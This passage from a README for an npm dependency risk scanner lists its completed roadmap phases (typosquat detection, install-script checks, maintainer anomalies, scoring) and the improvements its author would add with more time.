  270-package sample for an actual package flagged for dormancy and
  *nothing else*, and asserts it scores Low. (Also asserted directly at
  the unit level above — this is the same requirement checked against
  real data instead of a hand-built example.)

## Roadmap

- [x] Phase 1 — Foundation (CLI, dependency listing)
- [x] Phase 2 — Typosquat detection
- [x] Phase 3 — Install script red flags (registry API + script inspection)
- [x] Phase 4 — Maintainer & version anomalies
- [x] Phase 5 — Scoring & report (`--json`, colored output)

**MVP complete.** All five phases from the project brief are implemented,
empirically measured against real npm registry data, and covered by
automated tests (130 passing).

## What I'd add with more time

- Transitive dependency scanning (currently direct deps only)
- Damerau-Levenshtein for transposition-aware typosquat detection
- Deeper install-script analysis: fetch and scan the actual files a script
  invokes (e.g. `install.js`), not just the command string in `package.json`
- A persistent (file-based) registry-metadata cache, so re-scanning a
  project across separate CLI runs also skips redundant network calls
- Authenticated GitHub API access, to check every major-jump case (not just
  until the first rate-limit hit) and try more tag-naming conventions
- ML-based or reputation-weighted scoring instead of pure heuristics
- Real-time CI integration (fail a build on High-risk findings)
- Cross-checking flagged packages against [OSV.dev](https://osv.dev)'s
  known-malicious-package database
- A real distributed rate limiter (Vercel KV / Upstash) for the web
  version — the current in-memory one is confirmed to do nothing under
  `vercel dev` and is unreliable in production; see "Web version" above
- Threading an `AbortController` through `registryClient`/
  `githubReleaseCheck` so the web version's internal timeout actually
  cancels in-flight registry requests server-side, not just stops the
  client from waiting on them
